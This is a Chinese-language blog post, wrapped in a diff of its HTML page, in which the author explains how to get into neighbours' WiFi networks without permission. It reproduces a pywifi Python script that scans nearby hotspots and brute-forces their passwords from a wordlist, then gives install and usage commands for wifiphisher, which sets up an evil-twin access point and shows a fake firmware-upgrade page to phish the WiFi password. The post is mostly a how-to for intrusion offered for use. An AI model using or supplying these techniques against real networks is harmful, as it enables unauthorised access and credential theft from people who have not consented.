@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="EN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>蹭隔壁的WiFI | Swing&#39;Blog 浮生若梦</title>
+
+
+<meta name="description" content="Know it then hack it!">
+
+
+<meta name="author" content="Swing">
+
+
+
+<!-- Canonical -->
+<link rel="canonical" href="/wifi-attack.html">
+
+<!-- Favicon -->
+<link rel="icon" href="/images/favicon.ico">
+
+<!-- RSS -->
+
+<link rel="alternate" type="application/rss+xml" title="Swing&#39;Blog 浮生若梦" href="/atom.xml">
+
+
+<!-- Open Graph -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="蹭隔壁的WiFI">
+<meta property="og:url" content="/wifi-attack.html">
+<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
+
+<meta property="og:description" content="Know it then hack it!">
+
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="蹭隔壁的WiFI">
+
+<meta name="twitter:description" content="Know it then hack it!">
+
+
+<!-- Theme Color -->
+<meta name="theme-color" content="#1d1f21">
+<meta name="msapplication-TileColor" content="#1d1f21">
+
+<!-- Stylesheets -->
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<!-- Custom Layout Variables -->
+
+<style>
+:root {
+  --page-width: 60rem;
+  --content-width: 1200px;
+  --mobile-padding: 12px;
+}
+</style>
+
+<!-- Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-133464311-1');
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body class="theme-dark">
+  <div class="container">
+    <header class="header">
+  <div class="header-inner">
+    <div class="header-brand">
+      
+        <a href="/" class="logo">
+          <img src="/images/logo.png"
+               width="50"
+               height="50"
+               alt="Swing&#39;Blog 浮生若梦">
+        </a>
+      
+      <a href="/" class="site-title">
+        Swing&#39;Blog 浮生若梦
+      </a>
+    </div>
+
+    <nav class="nav">
+      <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation">
+        <span class="nav-toggle-bar"></span>
+        <span class="nav-toggle-bar"></span>
+        <span class="nav-toggle-bar"></span>
+      </button>
+
+      <ul class="nav-menu" id="nav-menu">
+        
+          
+          
+            
+            <li class="nav-item">
+              <a href="/"
+                 class="nav-link"
+                 >
+                Home
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/about/"
+                 class="nav-link"
+                 >
+                About
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/archives/"
+                 class="nav-link"
+                 >
+                Articles
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/atom.xml"
+                 class="nav-link"
+                 >
+                RSS
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/categories/"
+                 class="nav-link"
+                 >
+                Categories
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/link"
+                 class="nav-link"
+                 >
+                Links
+              </a>
+            </li>
+            
+          
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main class="main">
+      
+        <div class="page-layout">
+          <article class="post">
+  <header class="post-header">
+  <h1 class="post-title">蹭隔壁的WiFI</h1>
+
+  <div class="post-meta">
+    <span class="meta-item">
+      <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zM9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
+      <time datetime="2017-02-13">
+        2017-02-13
+      </time>
+    </span>
+
+    
+      <span class="meta-item">
+        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79s7.15 2.71 9.88 0C18.32 15.65 19 14.08 19 12.1h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58s9.14-3.47 12.65 0L21 3v7.12z"/></svg>
+        <time datetime="2026-02-07">
+          Updated on 2026-02-07
+        </time>
+      </span>
+    
+
+    
+      <span class="meta-item">
+        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
+        
+          <a href="/categories/Summary/">Summary</a>
+        
+      </span>
+    
+  </div>
+</header>
+
+
+  
+    <nav class="toc">
+  <h3 class="toc-title">Table of Contents</h3>
+  <div class="toc-list">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E8%B7%91%E5%AD%97%E5%85%B8"><span class="toc-text">0x01 跑字典</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-wifiphisher"><span class="toc-text">0x02 wifiphisher</span></a></li></ol>
+  </div>
+</nav>
+
+  
+
+  <div class="post-content">
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在家，由于某些原因家里还没网。老是去别人家蹭，都不好意思了。也试着跑隔壁的弱口令，但是没解决，想跑Pin吧，但是没环境。几经挫折，最后终于拿下了，可是信号好差……</p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>其实，我们蹭到隔壁无线的方法，最笨的有咱们可以跑跑字典阿，试试弱口令阿，实在不行，咱们可以利用Kali下的工具跑跑Pin码，甚至做一些更猥琐的事情。比如下面的内容。</p>
+<h1 id="0x01-跑字典"><a href="#0x01-跑字典" class="headerlink" title="0x01 跑字典"></a>0x01 跑字典</h1><p>一开始我试了几个弱口令，但是虽然是小村子，但是隔壁的wifi还是不少，我总不能一个一个试吧，这一点都不优雅，所以想到之前看到的python的一个模块，叫<strong>pywifi</strong>。得 咱们写一个脚本来跑跑密码吧。</p>
+<p>关键代码如下<br><strong>热点扫描</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scans</span>(<span class="params">face,timeout</span>):</span></span><br><span class="line">    <span class="comment">#开始扫描</span></span><br><span class="line">    face.scan()</span><br><span class="line">    time.sleep(timeout)</span><br><span class="line">    <span class="comment">#在若干秒后获取扫描结果</span></span><br><span class="line">    <span class="keyword">return</span> face.scan_results()</span><br></pre></td></tr></table></figure>
+<p><strong>热点攻击</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">i,face,x,key,stu,ts</span>):</span></span><br><span class="line">    <span class="comment">#显示对应网络名称，考虑到部分中文名啧显示bssid</span></span><br><span class="line">    showID = x.bssid <span class="keyword">if</span> <span class="built_in">len</span>(x.ssid)&gt;<span class="built_in">len</span>(x.bssid) <span class="keyword">else</span> x.ssid</span><br><span class="line">    <span class="comment">#迭代字典并进行爆破</span></span><br><span class="line">    <span class="keyword">for</span> n,k <span class="keyword">in</span> <span class="built_in">enumerate</span>(key):</span><br><span class="line">        x.key = k.strip()</span><br><span class="line">        <span class="comment">#移除所有热点配置</span></span><br><span class="line">        face.remove_all_network_profiles()</span><br><span class="line">        <span class="comment">#讲封装好的目标尝试连接</span></span><br><span class="line">        face.connect(face.add_network_profile(x))</span><br><span class="line">        <span class="comment">#初始化状态码，考虑到用0会发生些逻辑错误</span></span><br><span class="line">        code = <span class="number">10</span></span><br><span class="line">        t1 = time.time()</span><br><span class="line">        <span class="comment">#循环刷新状态，如果置为0则密码错误，如超时则进行下一个</span></span><br><span class="line">        <span class="keyword">while</span> code!=<span class="number">0</span> :</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            code = face.status()</span><br><span class="line">            now = time.time()-t1</span><br><span class="line">            <span class="keyword">if</span> now&gt;ts:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            stu.write(<span class="string">&quot;\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s&quot;</span>%(<span class="number">6</span>,i,<span class="number">18</span>,showID,code,<span class="number">5</span>,now,<span class="number">7</span>,x.signal,<span class="number">10</span>,<span class="built_in">len</span>(key)-n,<span class="number">10</span>,k.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)))</span><br><span class="line">            stu.flush()</span><br><span class="line">            <span class="keyword">if</span> code == <span class="number">4</span>:</span><br><span class="line">                face.disconnect()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;%-*s| %s | %*s |%*s\n&quot;</span>%(<span class="number">20</span>,x.ssid,x.bssid,<span class="number">3</span>,x.signal,<span class="number">15</span>,k)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#扫描时常</span></span><br><span class="line">    scantimes = <span class="number">3</span></span><br><span class="line">    <span class="comment">#单个密码测试延迟</span></span><br><span class="line">    testtimes = <span class="number">15</span></span><br><span class="line">    output = sys.stdout</span><br><span class="line">    <span class="comment">#结果文件保存路径</span></span><br><span class="line">    files = <span class="string">&quot;TestRes.txt&quot;</span></span><br><span class="line">    <span class="comment">#字典列表</span></span><br><span class="line">    keys = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;|KEYS %s&quot;</span>%(<span class="built_in">len</span>(keys))</span><br><span class="line">    <span class="comment">#实例化一个pywifi对象</span></span><br><span class="line">    wifi = PyWiFi()</span><br><span class="line">    <span class="comment">#选择定一个网卡并赋值于iface</span></span><br><span class="line">    iface = wifi.interfaces()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#通过iface进行一个时常为scantimes的扫描并获取附近的热点基础配置</span></span><br><span class="line">    scanres = scans(iface,scantimes)</span><br><span class="line">    <span class="comment">#统计附近被发现的热点数量</span></span><br><span class="line">    nums = <span class="built_in">len</span>(scanres)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;|SCAN GET %s&quot;</span>%(nums)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s&quot;</span>%(<span class="string">&quot;-&quot;</span>*<span class="number">70</span>,<span class="number">6</span>,<span class="string">&quot;WIFIID&quot;</span>,<span class="number">18</span>,<span class="string">&quot;SSID OR BSSID&quot;</span>,<span class="number">2</span>,<span class="string">&quot;N&quot;</span>,<span class="number">4</span>,<span class="string">&quot;time&quot;</span>,<span class="number">7</span>,<span class="string">&quot;signal&quot;</span>,<span class="number">10</span>,<span class="string">&quot;KEYNUM&quot;</span>,<span class="number">10</span>,<span class="string">&quot;KEY&quot;</span>,<span class="string">&quot;=&quot;</span>*<span class="number">70</span>)</span><br><span class="line">    <span class="comment">#将每一个热点信息逐一进行测试</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(scanres):</span><br><span class="line">        <span class="comment">#测试完毕后，成功的结果讲存储到files中</span></span><br><span class="line">        res = test(nums-i,iface,x,keys,output,testtimes)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            <span class="built_in">open</span>(files,<span class="string">&quot;a&quot;</span>).write(res)</span><br></pre></td></tr></table></figure>
+<p><em>作者：面包君<br>链接：<a href="https://zhuanlan.zhihu.com/p/25149544">https://zhuanlan.zhihu.com/p/25149544</a></em></p>
+<p>但是一点软用都没有，没辙，难道我也要去跑Pin码吗？但是峰回路转，我看到这篇文章附赠了一个链接。</p>
+<h1 id="0x02-wifiphisher"><a href="#0x02-wifiphisher" class="headerlink" title="0x02 wifiphisher"></a>0x02 wifiphisher</h1><p><strong>主要原理</strong></p>
+<ul>
+<li>创建一个伪AP来“狸猫换太子”，然后撤销用户AP的授权，</li>
+<li>通知用户需要进行“固件升级”，需要重新验证密码。你的假AP由于具有相同的SSID，用户便会“交代”密码。</li>
+<li>这样你就能得到用户的密码，并且让用户采用你的伪AP做为自己的接入点。而对方一无所知。</li>
+</ul>
+<p>从文章的介绍来看，是有相似的脚本的，比如它所提到的<code>Airsnaf</code>，不过这里文章所说的是Wifiphisher<br>Github源码 <a href="https://github.com/sophron/wifiphisher/releases/">链接</a><br><strong>安装</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sophron/wifiphisher.git <span class="comment"># Download the latest revision</span></span><br><span class="line"><span class="built_in">cd</span> wifiphisher <span class="comment"># Switch to tool&#x27;s directory</span></span><br><span class="line">sudo python setup.py install <span class="comment"># Install any dependencies (Currently, hostapd, dnsmasq, PyRIC, blessings) </span></span><br></pre></td></tr></table></figure>
+<p><strong>Usage</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd</span><br></pre></td></tr></table></figure>
+<p><a href="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67" class="gallery-item"><img src="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67"></a><br><a href="https://camo.githubusercontent.com/edac2b531e778d7c1e899743e5aecda7e322e1b5/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373322e706e67" class="gallery-item"><img src="https://camo.githubusercontent.com/edac2b531e778d7c1e899743e5aecda7e322e1b5/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373322e706e67"></a></p>
+<p>更多详细资料 <a href="https://github.com/sophron/wifiphisher">项目地址</a><br><a href="http://www.leiphone.com/news/201510/bKHbxozIz7zyYCFy.html">文章地址</a></p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+</div>
+
+
+  <footer class="post-footer">
+  
+    <div class="post-categories">
+      <span class="meta-label">Categories: </span>
+      
+        <a href="/categories/Summary/" class="category">Summary</a>
+      
+    </div>
+  
+  
+    <div class="post-tags">
+      <span class="meta-label">Tags: </span>
+      
+        <a href="/tags/wifi/" class="tag">wifi</a>
+      
+    </div>
+  
+</footer>
+
+
+  
+<nav class="post-nav">
+  
+    <div class="post-nav-item prev">
+      <span class="post-nav-label">&larr; Prev</span>
+      <a href="/memory-leak-with-dynelf.html" class="post-nav-title">
+        leak技巧以及DynELF的温习
+      </a>
+    </div>
+  
+
+  
+    <div class="post-nav-item next">
+      <span class="post-nav-label">Next &rarr;</span>
+      <a href="/those-of-the-breakpoint.html" class="post-nav-title">
+        断点的那些事
+      </a>
+    </div>
+  
+</nav>
+
+
+
+  
+    <section class="comments-section">
+  <h3 class="comments-title">Comments</h3>
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+      var disqus_config = function () {
+        this.page.url = 'https://bestwing.me/wifi-attack.html';
+        this.page.identifier = 'wifi-attack.html';
+      };
+      (function() {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://swing.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      })();
+    </script>
+  
+
+  
+
+  
+</section>
+
+  
+</article>
+
+        </div>
+      
+    </main>
+
+    <footer class="footer">
+  <div class="footer-content">
+    <div class="footer-left">
+      
+      <span class="copyright">
+        &copy; 2015 - 2026 Swing
+      </span>
+    </div>
+
+    <div class="footer-right">
+      
+        <span class="powered">
+          Powered by Hexo <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+        </span>
+      
+      
+        <span class="theme-info">
+          Theme <a href="https://github.com/WinMin/hexo-theme-Bloom" target="_blank" rel="noopener">Bloom</a>
+        </span>
+      
+    </div>
+  </div>
+
+  
+    <div class="footer-social">
+      
+        <a href="https://github.com/WinMin" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+        </a>
+      
+      
+        <a href="https://twitter.com/bestswngs" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        </a>
+      
+      
+      
+        <a href="mailto:ask@mail.exp.sh" class="social-link" aria-label="Email">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+        </a>
+      
+      
+        <a href="/atom.xml" class="social-link" aria-label="RSS">
+          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
+        </a>
+      
+    </div>
+  
+</footer>
+
+  </div>
+
+  <!-- Main Script -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Search -->
+
+
+<script src="/js/search.js"></script>
+
+
+
+<!-- Baidu Analytics -->
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</body>
+</html>
